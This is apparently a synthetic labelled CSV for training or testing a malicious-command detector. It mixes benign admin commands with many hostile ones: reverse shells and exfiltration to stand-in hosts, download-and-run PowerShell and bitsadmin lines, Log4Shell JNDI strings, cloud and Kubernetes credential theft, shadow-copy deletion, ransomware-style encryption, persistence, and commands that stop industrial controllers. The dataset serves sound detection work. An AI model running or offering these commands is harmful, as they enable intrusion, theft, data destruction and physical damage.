timestamp,src_ip,input,label
2026-01-20T17:46:38.719650,61.154.228.56,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.702379,50.129.135.240,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.728166,207.172.199.217,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.739701,101.81.21.50,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.740386,74.168.172.108,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.717597,156.243.225.16,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.733168,128.149.141.146,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.753424,192.93.117.188,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.720628,137.12.130.18,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.719650,107.217.32.176,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.731167,151.191.105.71,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.747362,27.205.14.74,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.742361,92.159.230.172,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.736168,83.206.186.130,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.731167,98.227.60.7,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.701356,127.68.178.228,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.722168,208.1.89.48,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.750363,154.102.23.47,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.710422,61.149.124.198,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.693354,35.94.133.5,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.690278,72.96.251.34,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.697356,197.48.77.76,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.743361,185.252.211.237,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.708422,31.220.10.196,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.693354,118.143.68.80,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.734167,154.95.114.84,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.719650,127.25.150.247,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.685785,112.32.19.175,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.701356,42.145.27.155,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.726165,165.113.198.111,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.738701,126.72.226.145,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.718598,6.122.244.181,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.753424,154.233.233.87,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.719650,104.91.118.43,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.745361,95.225.16.183,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.751920,75.104.46.226,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.698355,188.48.122.112,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.704359,57.47.128.250,make build,Normal_Business_Ops
2026-01-20T17:46:38.716597,164.37.42.35,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.737706,17.74.125.113,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.748407,102.89.206.55,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.722168,114.190.167.141,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.747362,54.36.210.49,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.715600,86.57.120.165,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.701356,54.104.99.93,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.688752,183.156.102.237,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.749363,171.50.25.144,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.742361,46.128.251.185,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.744361,20.171.145.95,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.686752,47.244.174.213,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.728166,119.88.93.210,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.710422,107.180.234.56,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.736168,82.252.111.119,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.719124,204.7.129.81,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.715600,50.95.49.30,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.710422,149.135.254.158,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.698355,164.48.152.33,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.737194,109.2.215.38,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.719650,85.45.114.161,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.687752,130.50.175.98,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.740386,59.35.201.153,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.743361,108.53.15.24,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.691257,18.151.0.35,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.754419,124.114.18.244,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.749363,105.177.134.129,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.751920,153.81.125.184,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.713423,27.25.185.16,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.736168,67.235.230.121,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.702379,40.155.99.197,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.692357,188.54.237.228,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.706916,163.38.55.175,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.719650,105.181.13.9,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.745361,34.114.143.84,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.702379,176.141.116.172,npm start,Normal_Business_Ops
2026-01-20T17:46:38.747362,60.125.19.212,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.750363,146.96.102.20,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.715600,127.168.104.156,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.721658,187.249.79.227,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.748407,109.137.95.3,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.750363,222.168.117.241,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.749363,205.5.161.125,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.731167,183.157.184.8,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.720628,23.211.202.250,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.691848,123.93.187.22,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.733168,222.10.33.230,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.717597,222.30.155.197,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.701356,184.60.113.113,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.697356,33.173.150.45,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.715600,28.31.194.44,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.690278,191.233.119.73,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.693354,127.211.238.166,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.686752,155.149.45.87,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.688752,81.134.59.12,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.710422,2.195.110.197,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.691257,66.126.161.32,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.731167,140.174.54.198,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.750363,158.215.90.12,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.713423,165.196.244.128,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.751920,113.160.135.220,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.694354,50.63.231.21,git branch,Normal_Business_Ops
2026-01-20T17:46:38.705366,51.65.60.225,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.707462,120.23.44.54,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.710422,86.220.14.43,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.743361,70.133.20.197,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.713423,213.13.160.173,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.714423,184.227.248.86,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.755771,123.255.57.86,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.725166,53.226.47.243,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.693354,114.33.187.59,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.713423,212.248.73.44,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.701356,84.255.75.162,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.714423,64.5.168.186,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.709422,122.201.113.6,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.688752,219.129.229.175,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.697356,79.7.249.41,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.712423,191.188.39.105,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.724165,199.74.116.233,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.755771,184.4.173.83,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.685785,48.87.65.246,whoami,Normal_Business_Ops
2026-01-20T17:46:38.738701,198.221.186.138,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.702379,198.207.10.41,whoami,Normal_Business_Ops
2026-01-20T17:46:38.696355,23.164.202.204,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.730167,97.167.141.206,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.750363,88.63.13.53,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.684749,149.30.140.155,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.741361,75.62.114.213,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.751920,212.242.47.49,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.748407,206.62.240.86,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.726165,183.93.185.205,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.753424,220.39.139.13,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.717597,128.177.117.153,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.704359,211.215.0.52,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.750363,106.9.92.164,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.727166,2.37.121.111,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.741361,24.23.21.138,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.725166,44.142.245.30,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.738701,15.103.125.125,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.723165,2.122.196.158,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.690278,53.111.48.42,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.709422,155.19.182.176,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.704359,125.86.211.197,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.697356,132.117.187.126,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.689753,64.24.152.140,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.710422,7.49.75.212,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.717597,87.249.42.222,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.707462,170.9.64.85,df -h,Normal_Business_Ops
2026-01-20T17:46:38.709422,202.12.147.231,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.692357,45.12.169.190,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.690278,61.173.195.48,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.719650,45.196.122.139,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.690278,173.42.52.186,git add .,Normal_Business_Ops
2026-01-20T17:46:38.749363,101.252.200.170,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.707462,193.52.33.84,npm start,Normal_Business_Ops
2026-01-20T17:46:38.728166,59.65.150.18,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.737706,194.16.150.163,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.719124,127.101.61.234,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.713423,51.103.239.118,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.685785,41.69.49.242,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.690278,80.232.106.92,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.704359,155.51.125.41,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.689753,95.241.115.113,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.755771,37.100.165.252,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.719650,132.127.70.101,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.718598,169.93.88.16,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.736168,120.32.59.35,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.695355,218.186.245.101,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.713423,107.211.154.76,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.694354,71.53.208.177,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.716597,74.115.14.56,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.728166,159.211.59.8,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.709422,146.117.166.160,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.746362,6.174.51.9,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.735167,136.177.217.158,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.736168,140.178.238.83,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.686752,196.198.23.153,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.690278,4.49.204.19,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.711422,140.65.104.21,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.700357,64.208.183.43,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.714423,22.148.52.66,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
